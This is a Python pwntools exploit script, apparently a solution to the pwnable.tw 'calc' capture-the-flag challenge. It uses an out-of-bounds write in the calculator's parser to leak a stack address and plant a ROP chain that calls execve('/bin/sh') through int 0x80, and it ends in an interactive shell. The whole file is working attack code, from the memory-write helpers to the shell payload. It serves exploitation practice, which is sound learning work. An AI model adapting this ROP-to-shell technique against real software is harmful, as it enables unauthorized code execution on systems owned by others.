#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

# p=remote('chall.pwnable.tw',10100)
p = process('./calc')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

# gdb.attach(p, 'b *0x08049433')

result_pool_addr = 0xffffd118
ebp_addr = 0xffffd0f8

pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
int_80 = 0x08049a21


def write_to_mem(offset, content):
    payload = '+' + str(offset)
    p.sendline(payload)
    old_val = int(p.recv())
    p.sendline('+' + str(offset) + '-' + str(old_val) + '+' + str(content))
    p.recv()

def write_to_mem_fushu(offset, content):
    payload = '+' + str(offset)
    p.sendline(payload)
    old_val = int(p.recv())
    p.sendline('+' + str(offset) + '-' + str(old_val) +  str(content))
    p.recv()

def write_to_mem_zero(offset):
    payload = '+' + str(offset)
    p.sendline(payload)
    old_val = int(p.recv())
    p.sendline('+' + str(offset) + '-' + str(old_val))
    p.recv()

def write_to_mem_less(offset, content):
    payload = '+' + str(offset)
    p.sendline(payload)
    old_val = int(p.recv())
    if content > old_val:
        less = content - old_val
        p.sendline('+' + str(offset) + '+' + str(less))
    else:
        less = old_val - content
        p.sendline('+' + str(offset) + '-' + str(less))
    p.recv()
    

def leak_ebp(offset):
    p.recv(1024)
    payload = '+' + str(offset)
    p.sendline(payload)
    old_value = int(p.recv())
    return old_value

leaked_ebp = leak_ebp(360)

write_to_mem(361, pop_eax)
write_to_mem(362, 11)
write_to_mem(363, pop_edx_ecx_ebx)
write_to_mem_zero(364)
write_to_mem_zero(365)
write_to_mem_fushu(366, leaked_ebp)
write_to_mem(367, int_80)
write_to_mem(368, u32('/bin'))
write_to_mem(369, u32('/sh\x00'))


p.sendline('bye')

p.interactive()